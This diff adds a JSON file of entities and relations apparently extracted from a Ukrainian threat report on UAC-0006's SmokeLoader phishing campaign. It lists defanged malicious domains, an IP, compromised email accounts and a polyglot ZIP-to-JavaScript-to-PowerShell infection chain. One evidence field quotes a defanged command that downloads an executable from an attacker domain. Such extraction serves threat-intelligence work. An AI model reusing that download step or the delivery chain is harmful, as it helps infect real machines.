@@ -1,0 +1,183 @@
+{
+  "entities": [
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cybercriminal group active since at least 2013 targeting financial accounts."
+    },
+    {
+      "name": "SmokeLoader",
+      "kind": "malware family",
+      "gloss": "A malicious modular loader used to download and execute additional malware payloads."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software tool",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software component",
+      "gloss": "A Microsoft Windows component providing scripting capabilities, executed via wscript.exe or cscript.exe."
+    },
+    {
+      "name": "pax_2023_ab1058.zip",
+      "kind": "malicious archive",
+      "gloss": "A polyglot ZIP archive containing a decoy document and a malicious JavaScript loader."
+    },
+    {
+      "name": "pax_2023_AB1058.pdf",
+      "kind": "decoy file",
+      "gloss": "A PDF decoy document contained within the malicious ZIP archive."
+    },
+    {
+      "name": "pax_2023_ab1058..js",
+      "kind": "malware loader",
+      "gloss": "A malicious JavaScript loader executing PowerShell commands to download secondary payloads."
+    },
+    {
+      "name": "portable.exe",
+      "kind": "executable file",
+      "gloss": "A downloaded executable file used to unpack and launch SmokeLoader."
+    },
+    {
+      "name": "smoke.exe",
+      "kind": "executable file",
+      "gloss": "An executable payload file associated with SmokeLoader malware."
+    },
+    {
+      "name": "beliy@atl.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious phishing emails."
+    },
+    {
+      "name": "inbox6@dl.kr-admin.gov.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious phishing emails."
+    },
+    {
+      "name": "nvn@mayak.dp.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious phishing emails."
+    },
+    {
+      "name": "homospoison[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain used to host and distribute executable payloads."
+    },
+    {
+      "name": "3dstore[.]pro",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "balkimotion[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "coudzoom[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "criticalosl[.]tech",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "humanitarydp[.]ug",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "ipodromlan[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "lamazone[.]site",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "ligaspace[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "maximprofile[.]net",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "redport80[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "shopersport[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "sindoproperty[.]org",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "superboler[.]com",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "zaliphone[.]com",
+      "kind": "domain name",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "193[.]106.175.177",
+      "kind": "ip address",
+      "gloss": "An IP address identified as malicious network infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "SmokeLoader",
+      "evidence": "активність групи UAC-0006 є фінансово-мотивованою... здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "delivers",
+      "tail": "pax_2023_ab1058..js",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку та JavaScript-файл \"pax_2023_AB1058..js\""
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "delivers",
+      "tail": "pax_2023_AB1058.pdf",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку"
+    },
+    {
+      "head": "pax_2023_ab1058..js",
+      "type": "delivers",
+      "tail": "portable.exe",
+      "evidence": "JavaScript-файл \"pax_2023_AB1058..js\", який, використовуючи PowerShell, забезпечить завантаження та запуск виконуваного файлу \"portable.exe\""
+    },
+    {
+      "head": "portable.exe",
+      "type": "delivers",
+      "tail": "SmokeLoader",
+      "evidence": "\"portable.exe\". Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "homospoison[.]ru",
+      "type": "hosts",
+      "tail": "portable.exe",
+      "evidence": "downloadfile('hxxp://homospoison[.]ru/one/portable.exe','%%temp%%gEq94.exe')"
+    }
+  ],
+  "newRelationTypes": []
+}
